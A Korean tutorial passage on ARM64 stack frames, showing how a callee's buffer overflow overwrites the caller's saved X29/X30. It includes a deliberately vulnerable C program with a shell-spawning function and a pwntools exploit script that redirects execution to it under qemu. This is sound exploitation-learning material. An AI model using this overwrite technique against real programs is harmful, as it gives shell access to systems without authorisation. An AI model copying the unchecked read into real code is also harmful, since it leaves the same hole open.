스택프레임

```
----------
saved X29
----------
saved X30
----------


buffer


----------
```

이런 구조이다. 즉 buffer에서 입력을 써내려가도 자신의 sfp와 ret을 overwrite할 수 없다.
대신 다른 함수가 호출되면 다음과 같아 진다.

```
----------
saved X29
----------
saved X30
----------

buffer

----------
saved X29
----------
saved X30
----------

buffer

----------
```

이렇게 된다. 즉 callee 함수에서 caller 함수의 sfp와 ret을 덮을 수 있다는 것이다. 이를 이용해서 buffer overflow를 일으켜서 rce 가 가능하다.

### 예제
```c
#include <stdio.h>

void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

void getshell(){
    execve("/bin/sh",0, 0);
}

void func(){
    char buf[0x30];
    printf(">> ");
    read(0, buf, 0x50);
}

int main()
{
	setup_environment();
	printf("Hello World\n");
	func();
	return 0;
}
```
간단한 c코드 이다. main함수에서 func 함수가 실행되고 func함수에서 overflow가 발생하니 main함수의 ret을 덮을 수 있다.

```python
from pwn import *

#context.log_level = 'debug'

context.update(arch='arm', os='linux')

p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "./exam"])
#p = remote("localhost", 8888)


ex = b''
ex += b'a'*0x30
ex += b'b'*0x8
ex += p64(0x00000000004007ec)

p.sendlineafter(b">> ", ex)
p.interactive()
```
해당 실행 코드는 그냥 실행을 못하고 
`qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./exam`
이렇게 실행해야 한다. 그래서 다음과 같이 process안에 저렇게 해주었다.

셸이 잘 따였다.
![](https://i.imgur.com/Wp5qzxc.png)
